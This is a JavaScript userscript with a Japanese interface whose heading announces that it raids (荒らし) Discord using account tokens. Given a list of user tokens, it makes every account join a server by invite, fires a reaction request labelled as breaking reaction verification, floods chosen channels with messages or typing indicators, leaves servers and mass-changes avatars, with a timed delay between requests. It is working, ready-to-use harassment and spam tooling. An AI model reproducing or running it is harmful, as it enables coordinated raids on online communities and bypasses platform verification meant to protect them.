(function() {
    'use strict';
    var h = $("<div>").appendTo($("body").css({
        "text-align": "center"
    }));
    $("<div>",{text:"最終更新：2020/08/08 22:21"}).appendTo(h);
    $("<h1>",{text:"Tokenを使って、Discordの荒らしができます。"}).appendTo(h);
    h.append("Tokenの取得の方法は、");
    $("<a>",{
        text: "こちら",
        href: "https://shunshun94.github.io/shared/sample/discordAccountToken",
        target: "_blank"
    }).appendTo(h);
    h.append("を参照してください。<br><br>");
    function addTextarea(placeholder){
        function shape(){
            var text = t.val();
            t.height((text.split('\n').length + 2) + "em");
        }
        var t = $("<textarea>", {
            placeholder: placeholder
        }).appendTo(h).keyup(shape).click(shape).css({
            width: "70%",
            height: "3em"
        });
        return t;
    }
    function splitLine(str){
        return str.split('\n').filter(function(v){
            return v;
        });
    }
    var input_token = addTextarea("Tokenを改行で区切って入力してください。").change(function(){
        var ar = [];
        input_token.val(splitLine($(this).val()).filter(function(v){
            if(/[^0-9a-zA-Z\.\-_]/.test(v)) return false;
            if(v.length !== 59) return false;
            if(ar.indexOf(v) !== -1) return false;
            ar.push(v);
            return true;
        }).join('\n'));
    });
    var input_time = addInput("リクエスト送信間隔","[秒]").attr({
        type: "number",
        value: 1,
        max: 5,
        min: 0,
        step: 0.1,
    });
    function makeTime(a, b = 0, len = 0){
        var n = Number(input_time.val());
        return (a + b * len) * n * 1000;
    }
    h.append("<br><br><br>");
    var input_invidedURL = addInput("招待リンク","https://discord.gg/g3Xq7vc");
    addBtn("招待を受ける", enter);
    h.append("<br><br>");
    var input_PUT_URL = addInput("PUT_URL(認証突破用)","https://discord.com/api/v6/channels/741212688579035216/messages/741215711791415307/reactions/%F0%9F%91%8D/%40me");
    addBtn("PUTリクエスト", send_put);
    h.append("<br><br><br>");
    var input_url = addTextarea("発言する場所のURLを改行で区切って入力してください。\nhttps://discordapp.com/channels/635695825405607956/635695825405607958");
    var input_saying = addTextarea("発言内容を入力してください。\n空の場合は点呼を取ります。");
    h.append("<br>");
    addBtn("サーバーから脱退", exit);
    addBtn("入力中", typing);
    addBtn("発言", say);
    h.append("<br><br><br>");
    //var input_username = addInput("プロフィールの名前");
    //var input_pass = addInput("現在のパスワード");
    // var input_pass_new = addInput("新しいパスワード(省略可)");
    addBtn("アバターの設定", set_avatar);
    var view_avatar_elm = $("<div>").appendTo(h);
    addBtn("プロフィールの更新", update_profile);
    //---------------------------------------------------------------------------------
    // 招待を受ける
    function enter(){
        var m = input_invidedURL.val().match(/\/([a-zA-Z0-9]+)\/?$/);
        if(!m) return alert("招待リンクを設定してください。");
        var url = "https://discordapp.com/api/v6/invites/" + m[1];
        splitLine(input_token.val()).map(function(v,i){
            var xhr = new XMLHttpRequest();
            xhr.open( 'POST', url );
            xhr.setRequestHeader( "authorization", v );
            xhr.setRequestHeader( "content-type", "application/json" );
            setTimeout(function(){
                xhr.send();
            },makeTime(i));
        });
    }
    // リアクション認証を突破する
    function send_put(){
        var url = input_PUT_URL.val();
        if(!url) return alert("PUTリクエストのURLを設定してください。");
        splitLine(input_token.val()).map(function(v,i){
            var xhr = new XMLHttpRequest();
            xhr.open( 'PUT', url );
            xhr.setRequestHeader( "authorization", v );
            xhr.setRequestHeader( "content-type", "application/json" );
            setTimeout(function(){
                xhr.send();
            },makeTime(i));
        });
    }
    // サーバーから脱退
    function exit(){
        var m = input_url.val().match(/([0-9]+)\/([0-9]+)/);
        if(!m) return;
        var url = "https://discordapp.com/api/v6/users/@me/guilds/" + m[1];
        splitLine(input_token.val()).map(function(v,i){
            var xhr = new XMLHttpRequest();
            xhr.open( 'DELETE', url );
            xhr.setRequestHeader( "authorization", v );
            setTimeout(function(){
                xhr.send();
            },makeTime(i));
        });
    }
    // 入力中
    function typing(){
        splitLine(input_url.val()).map(function(str,o,a){
            var m = str.match(/([0-9]+)\/([0-9]+)/);
            if(!m) return;
            var room_id = m[2];
            var url = `https://discordapp.com/api/v6/channels/${room_id}/typing`;
            splitLine(input_token.val()).map(function(v,i){
                var xhr = new XMLHttpRequest();
                xhr.open( 'POST', url );
                xhr.setRequestHeader( "authorization", v );
                setTimeout(function(){
                    xhr.send();
                },makeTime(o,i,a.length));
            });
        });
    }
    // 発言
    function say(){
        splitLine(input_url.val()).map(function(str,o,a){
            var m = str.match(/([0-9]+)\/([0-9]+)/);
            if(!m) return;
            var room_id = m[2];
            var url = `https://discordapp.com/api/v6/channels/${room_id}/messages`;
            splitLine(input_token.val()).map(function(v,i){
                var data = { content: input_saying.val() || (i+1)+"体目", tts: false, };
                var xhr = new XMLHttpRequest();
                xhr.open( 'POST', url );
                xhr.setRequestHeader( "authorization", v );
                xhr.setRequestHeader( "content-type", "application/json" );
                setTimeout(function(){
                    xhr.send(JSON.stringify(data));
                },makeTime(o,i,a.length));
            });
        });
    }
    var g_avatar;
    // アバターの設定
    function set_avatar(){
        alert("設定するアバター画像を選択してください。");
        getBase64fromFile(function(avatar){
            g_avatar = avatar;
            $("<img>",{src: avatar}).appendTo(view_avatar_elm.empty());
        });
    }
    // プロフィールの更新
    function update_profile(){
        if(!g_avatar) return alert("アバターを設定してください。");
        splitLine(input_token.val()).map(function(v,i){
            var data = {
                //username: input_username.val(),
                //email: null,
                //password: input_pass.val(),
                avatar: g_avatar,
                //discriminator: null,
                //new_password: null
            };
            // if(input_pass_new.val()) data.new_password = input_pass_new.val();
            var xhr = new XMLHttpRequest();
            var url = "https://discordapp.com/api/v6/users/@me";
            xhr.open( 'PATCH', url );
            xhr.setRequestHeader( "authorization", v );
            xhr.setRequestHeader( "content-type", "application/json" );
            setTimeout(function(){
                xhr.send(JSON.stringify(data));
            },makeTime(i));
        });
    }
    // ファイルから画像を取得してBase64化
    function getBase64fromFile(callback){
        var input = document.createElement('input');
        input.type = "file";
        input.addEventListener('change', function(){
            if(!input.files.length) return;
            var file = input.files[0];
            var fr = new FileReader();
            fr.addEventListener('load', function(evt){
                callback(evt.target.result);
            });
            callback();
            fr.readAsDataURL(file);
        });
        input.click();
    }
    function addInput(title, placeholder){
        return $("<input>",{
            placeholder: placeholder
        }).appendTo($("<div>",{text: title + ':'}).appendTo(h));
    }
    function addBtn(title, func){
        return $("<button>",{text:title}).click(func).appendTo(h);
    }
})();
